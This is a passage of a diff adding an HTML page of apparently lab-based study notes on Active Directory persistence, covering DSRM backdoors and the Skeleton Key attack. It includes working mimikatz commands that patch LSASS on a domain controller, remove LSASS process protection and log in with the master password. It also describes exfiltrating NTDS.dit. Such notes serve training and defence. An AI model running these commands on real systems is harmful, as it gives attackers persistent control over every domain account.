+<li>Even if blue team resets AD accounts, krbtgt, or tickets → attacker can boot DC into DSRM and regain control</li>
+</ul>
+<hr />
+<p>3️⃣ <strong>Bypass domain monitoring</strong></p>
+<ul>
+<li><p>Domain actions create logs and alerts (e.g., Kerberos, LDAP)</p></li>
+<li><p>DSRM logins or offline access don’t trigger domain-level logs</p></li>
+</ul>
+<hr />
+<p>4️⃣ <strong>Stealthy access to AD files</strong></p>
+<ul>
+<li><p>Directly copy, tamper, or exfiltrate <strong>NTDS.dit</strong> and registry hives offline</p></li>
+<li><p>No domain APIs, no domain ACLs stop you</p></li>
+</ul>
+<hr />
+<p>5️⃣ <strong>Easy to exploit</strong></p>
+<ul>
+<li><p>DSRM passwords are often old, never changed</p></li>
+<li><p>Many orgs don’t monitor <code>DsrmAdminLogonBehavior</code> or DSRM usage</p></li>
+</ul>
+<hr />
+<h4 id="in-short">🌟 <strong>In short</strong></h4>
+<p>👉 DSRM gives attackers:</p>
+<ul>
+<li><p>Local admin on the DC OS</p></li>
+<li><p>Persistence beyond domain recovery</p></li>
+<li><p>A stealthy fallback path if DA access is lost</p></li>
+</ul>
+<hr />
+<h4 id="analogy">🚀 <strong>Analogy</strong></h4>
+<p>👉 DA = keys to the house (AD)</p>
+<p>👉 DSRM = keys to the safe inside the house (DC OS)</p>
+<p>Even if house locks change, you still open the safe.</p>
+<hr />
+<h4 id="one-line-answer">🔥 One-Line Answer</h4>
+<blockquote>
+<p><strong>Yes — you dump the DSRM (local admin) hash from the DC and enable its login via registry, not to gain more privilege, but to create a stealthy, persistent backdoor independent of Active Directory.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h2 id="skeleton-key-attack">Skeleton Key Attack</h2>
+<h4 id="what-is-the-skeleton-key-attack">🚩 <strong>What is the Skeleton Key attack?</strong></h4>
+<p>Skeleton Key is a <strong>post-exploitation persistence technique</strong> where an attacker patches the <strong>LSASS (Local Security Authority Subsystem Service)</strong> process on a <strong>Domain Controller (DC)</strong>.</p>
+<ul>
+<li><p>Once patched, the DC accepts <em>any user’s legitimate password</em> <strong>or</strong> a single attacker-defined master password (the “Skeleton Key”) to authenticate.</p></li>
+<li><p>This means the attacker can log in as <strong>any domain user</strong> using that master password.</p></li>
+</ul>
+<p><strong>In simple words:</strong></p>
+<p>The <strong>Skeleton Key attack</strong> is a post-exploitation technique where:</p>
+<ul>
+<li><p>An attacker <strong>injects a master password (the “skeleton key”) into the LSASS process on a Domain Controller (DC)</strong>.</p></li>
+<li><p>This makes <strong>LSASS accept both the legitimate user’s password and a secret attacker-defined password</strong> (e.g. <code>mimikatz</code>) for any domain user.</p></li>
+</ul>
+<h4 id="result">🧠 Result</h4>
+<pre><code>
+When user logs in:
+
+    If password == real password → allow
+
+    OR
+
+    If password == attacker master password → allow
+</code></pre>
+<blockquote>
+<p><strong><em>In a Skeleton Key attack, you patch LSASS on the Domain Controller to inject a master password. This lets you authenticate as any domain user on any domain-joined machine (including the DC), using the valid username with the skeleton key as the password.</em></strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="how-does-it-work">⚙ <strong>How does it work?</strong></h4>
+<ul>
+<li><p>The attack modifies the authentication process in memory (in LSASS), adding logic to accept the attacker’s password.</p></li>
+<li><p>The legitimate password still works — users don’t notice anything is wrong.</p></li>
+<li><p>The attacker doesn’t need to reset or steal any passwords; they simply bypass them using the master key.</p></li>
+</ul>
+<h4 id="why">🧠 Why?</h4>
+<p>To perform Skeleton Key attack, you need:</p>
+<p><strong>Ability to:</strong></p>
+<ul>
+<li><p>Access Domain Controller</p></li>
+<li><p>Inject into LSASS process</p></li>
+</ul>
+<h4 id="that-requires">🔑 That requires:</h4>
+<ul>
+<li>Domain Admin</li>
+</ul>
+<p>OR</p>
+<ul>
+<li>Equivalent privileges like:
+<ul>
+<li>SYSTEM on DC</li>
+<li>SeDebugPrivilege on DC</li>
+</ul></li>
+</ul>
+<h4 id="how-does-it-work-1">⚙ <strong>How does it work?</strong></h4>
+<p>1️⃣ The attacker <strong>compromises a Domain Admin (DA) account or equivalent</strong> (required because you need permission to modify LSASS on the DC).</p>
+<p>2️⃣ The attacker runs:</p>
+<pre><code>
+mimikatz.exe &#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39; -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+</code></pre>
+<p>📌 <strong>Explanation of command parts:</strong></p>
+<ul>
+<li><p><code>privilege::debug</code> → Enables debug rights, required to modify LSASS memory.</p></li>
+<li><p><code>misc::skeleton</code> → Injects the skeleton key logic into LSASS.</p></li>
+<li><p><code>ComputerName dcorp-dc.dollarcorp.moneycorp.local</code> → Specifies the target DC where LSASS will be patched.</p></li>
+</ul>
+<p>👉 This injects the logic that sets the <strong>master password to <code>mimikatz</code>(</strong>as the tool here being used is mimikatz so it sets the master password as <strong>“mimikatz”</strong>.</p>
+<hr />
+<p>3️⃣ Once the patch is in place:</p>
+<ul>
+<li><p>The DC continues to accept normal passwords.</p></li>
+<li><p>The DC <strong>also accepts <code>mimikatz</code> as the password for any domain user</strong>.</p></li>
+</ul>
+<hr />
+<p>4️⃣ The attacker can now access any domain-joined machine:</p>
+<p>Example:</p>
+<pre class="powershell"><code>
+Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
+</code></pre>
+<p>➡ The attacker uses:</p>
+<ul>
+<li><p><code>dcorp\Administrator</code></p></li>
+<li><p>Password: <code>mimikatz</code></p></li>
+</ul>
+<p>This works even if they don’t know the real <code>Administrator</code> password!</p>
+<hr />
+<h4 id="limitations-risks">⚠ <strong>Limitations / Risks</strong></h4>
+<div class="line-block">Limitation | Details |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Not persistent</strong> | The patch is in LSASS memory. It is <strong>lost on reboot</strong> of the DC. The attacker would need to reapply the patch after a reboot. |</div>
+<div class="line-block"><strong>Not OPSEC safe</strong> | Easily detectable by memory scanners, EDR, or tools monitoring LSASS integrity. The patch changes LSASS in ways that can cause instability. |</div>
+<div class="line-block"><strong>May cause AD CS issues</strong> | The skeleton key patch can interfere with <strong>Active Directory Certificate Services (AD CS)</strong>, potentially breaking or destabilizing certificate-based functions. |</div>
+<div class="line-block"><strong>Leaves no AD object evidence</strong> | No password changes or new accounts — makes detection via AD logs harder, but memory monitoring can spot it. |</div>
+<hr />
+<h4 id="persistence-4">🔑 <strong>Persistence</strong></h4>
+<ul>
+<li>Skeleton Key is not naturally persistent because:
+<ul>
+<li>It relies on <em>live patching LSASS</em> in memory.</li>
+<li>A reboot clears the modification.</li>
+</ul></li>
+<li>If an attacker wants persistence beyond reboot, they would need to:
+<ul>
+<li>Re-run the Skeleton Key payload after every DC reboot.</li>
+<li>Set up another persistence mechanism to ensure the payload is reinjected (e.g., malicious service or scheduled task).</li>
+</ul></li>
+</ul>
+<hr />
+<h4 id="detection-challenges">🕵 <strong>Detection challenges</strong></h4>
+<ul>
+<li><p>Since legitimate credentials still work, users don’t notice anything unusual.</p></li>
+<li><p>No abnormal logins — domain controllers simply accept the additional password.</p></li>
+<li><p>Detection relies on:</p>
+<ul>
+<li><strong>Memory integrity monitoring</strong> (e.g., LSASS memory scanning)</li>
+<li><strong>Unusual logons with unexpected password patterns</strong></li>
+<li><strong>Reboots wiping the patch — look for attackers re-applying Skeleton Key</strong></li>
+</ul></li>
+</ul>
+<hr />
+<p>💡 <strong>Note:</strong></p>
+<p>Skeleton Key is most useful in scenarios where:</p>
+<ul>
+<li><p>The attacker already has <strong>Domain Admin</strong> or equivalent privilege (since they need to modify LSASS memory on the DC).</p></li>
+<li><p>They want stealthy lateral movement or persistence <em>without changing AD objects</em>.</p></li>
+<li><p>In case lsass is running as a protected process, we can still use Skeleton</p></li>
+</ul>
+<p>Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target</p>
+<p>DC:</p>
+<p>***mimikatz # privilege::debug</p>
+<p>mimikatz # !+</p>
+<p>mimikatz # !processprotect /process:lsass.exe /remove</p>
+<p>mimikatz # misc::skeleton</p>
+<p>mimikatz # !-***</p>
+<p>• Note that above would be very noisy in logs - Service installation (Kernel</p>
+<p>mode driver)</p>
+<h4 id="final-answer-to-your-question">🔥 Final Answer to Your Question</h4>
+<blockquote>
+<p><strong>Yes — if LSASS is patched on the Domain Controller, any domain user can authenticate using the master password until the DC is rebooted, and performing this attack typically requires Domain Admin (or equivalent) privileges.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+</article>
+  <aside class="toc-rail"><div class="toc-title">On this page</div><ul>
+<li class="lvl2"><a href="#golden-ticket-attack">Golden Ticket Attack</a></li>
+<li class="lvl2"><a href="#how-the-golden-ticket-attack-works-step-by-step">🔧 How the Golden Ticket Attack Works (Step-by-Step)</a></li>
+<li class="lvl2"><a href="#what-if-we-impersonate-a-non-existing-user">What if we impersonate a non-existing user?</a></li>
+<li class="lvl2"><a href="#step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the krbtgt Hash</a></li>
+<li class="lvl2"><a href="#method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</a></li>
+<li class="lvl2"><a href="#diamond-ticket-attack">Diamond Ticket Attack</a></li>
+<li class="lvl2"><a href="#sliver-ticket-attack">Sliver Ticket Attack</a></li>
+<li class="lvl2"><a href="#what-is-a-silver-ticket-attack">🚀 What is a Silver Ticket Attack?</a></li>
+<li class="lvl2"><a href="#step-by-step-exploitation">⚔️ Step-by-Step Exploitation</a></li>
+<li class="lvl2"><a href="#difference-between-golden-silver-diamond">Difference Between Golden Silver &amp;amp; Diamond</a></li>
+<li class="lvl2"><a href="#persistence-using-acl--adminsdholder---domain-persistence">Persistence using ACL -AdminSDHolder - Domain Persistence</a></li>
+<li class="lvl2"><a href="#dsrm-attack---domain-persistence">DSRM Attack - Domain Persistence</a></li>
+<li class="lvl2"><a href="#skeleton-key-attack">Skeleton Key Attack</a></li>
+</ul></aside>
+</div>
+
+</main>
+</div>
+<button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">🌙</button>
+<button class="totop" id="toTop" onclick="scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/fulltext-index.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
